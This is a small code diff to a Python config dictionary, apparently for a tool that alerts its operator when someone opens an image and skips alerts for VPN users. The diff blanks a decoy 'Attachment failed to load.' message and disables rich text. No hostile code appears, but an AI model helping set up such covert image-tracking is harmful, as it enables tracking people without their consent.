@@ -28,8 +28,8 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "Attachment failed to load.", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "message": "", # Message to show
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
